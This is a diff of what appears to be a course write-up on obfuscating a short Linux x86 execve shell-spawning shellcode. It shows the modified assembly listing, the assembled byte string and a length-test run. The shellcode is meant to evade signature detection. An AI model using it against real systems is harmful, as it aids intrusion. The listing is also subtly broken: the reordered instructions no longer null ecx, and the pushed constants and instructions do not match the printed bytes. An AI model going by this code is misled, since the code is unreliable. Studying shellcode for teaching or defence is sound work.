@@ -16,18 +16,21 @@ Original shellcode was written by *ipv*. The paylod is rather simple: it's an ex
 
 The shellcode is rather short at 21 bytes, so there is little to change. 
 
-To obfuscate the shellcode we can expand some of the instructions so they seem different compared to the original shellcode. First I used different method for nulling out registers, I xor'd eax and moved it's value into the other registers. After that, I used mov instead of push-pop for the execve syscall. The name of the command has also been obfuscated, so it's less obvious.
+To obfuscate the shellcode we can expand some of the instructions so they seem different compared to the original shellcode. First I used different method for nulling out registers, I xor'd eax and moved it's value into the other registers. After that, I used mov instead of push-pop for the execve syscall. The name of the command has also been modified.
 
     xor eax,eax ; null out eax
     mov edx, eax ; null out edx
-    mov ecx, eax ; null out ecx
     mov al, 0xb ; 11 execve syscall
+    mov ecx, eax ; null out ecx
     push edx  ; push null to stack
     push 0x683f2f2f ; "//?h"
     push 0x6e3f3f2f ; "/??n"
     mov ebx, esp ; stores executable path in ebx
     int 0x80 ; init syscall
 
-After compiling and linking we get the following code:
+After compiling and linking we get the following shellcode at 23 bytes:
     "\x31\xc0\x89\xc2\xb0\x0b\x89\xd1\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xcd\x80"
+
+    slae@slae: ~/SLAE$ ./polyexecve
+    Shellcode Length: 23
 
